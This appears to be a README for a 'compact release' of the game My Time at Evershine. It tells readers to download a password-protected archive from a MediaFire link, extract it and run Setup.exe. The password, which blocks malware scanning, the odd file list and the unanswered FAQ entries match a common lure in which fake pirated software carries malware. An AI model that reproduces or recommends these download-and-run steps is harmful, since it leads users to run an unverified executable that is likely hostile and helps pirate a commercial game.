## 🕹️ About

My Time at Evershine is a 3D open-world simulation RPG set in a hopeful post-apocalyptic world. As the Governor of Evershine, you recruit settlers, expand infrastructure, gather resources, and guide a new frontier community. Explore ancient ruins and wild landscapes, build relationships with unique characters, and shape the settlement through story quests, crafting, and cooperative adventures. This compact release uses a compressed archive to reduce download size; the game content remains unchanged.

Evershine is made for players who enjoy cozy life simulation, exploration, character-driven RPGs, crafting, and community management.

## ✨ Features

- ⚔️ **Adventure Together** — Explore dangerous areas, recruit followers, and face challenges with up to three friends.
- 🏘️ **Grow Evershine** — Recruit settlers, expand infrastructure, and guide a thriving frontier community.
- 🧭 **Explore the Wilds** — Climb, glide, and uncover ruins, treasures, and mysteries across a vibrant 3D world.
- 🛠️ **Gather and Create** — Collect resources, produce useful materials, and support the settlement’s growth.
- 💬 **Build Relationships** — Meet memorable settlers, form lasting friendships, and pursue meaningful romance.
- 🎉 **Seasonal Activities** — Take part in festivals, mini-games, side quests, and community events.

## 📦 Download & Extraction

| Platform | Status |

This release is distributed as a compact, compressed archive. The game itself is unchanged — only the packaging is smaller.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- launcher.dll <- Launcher library
|-- license.bank <- License data
|-- audio.res <- Audio resources
|-- res.pak <- Resources archive
|-- settings.bin <- Configuration
|-- global.cfg <- Global settings
|-- assets.wem <- Asset audio
|-- lang.sys <- Language system
|-- scripts.lic <- Game scripts
|-- driver.umap <- Driver data
|-- animations.dll <- Animation system
|-- physics.sys <- Physics engine
|-- patch_1.bnk <- Audio banks
|-- uninstall.key <- Uninstall key
|-- update_1.res <- Update resources
|-- localization.ini <- Language files
|-- driver.pak <- Driver archive
|-- license.wem <- Audio assets
|-- update_1.ini <- Update config
|-- installer.dat <- Installer data
|-- api.pak <- API modules
|-- dlc.md5 <- DLC checksums
|-- Password 2026.txt <- Password reminder (empty)
|-- bootstrap.wem <- Bootstrap audio
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start

## ❓ Frequently Asked Questions (FAQ)

**Q: Why is this release compact?**
**A:** The game files are packed using high-ratio compression to reduce the download size. The game itself is unchanged — it's the same content, just delivered in a smaller package.

**Q: What platforms are supported?**
**A:** The current focus is Windows. Other platforms are not part of the active roadmap at this time.

**Q: What are the system requirements?**
**A:** The compact release targets the same hardware as the original game. See the System Requirements section above.

**Q: Can I contribute?**

**Q: Can I share this repository?**
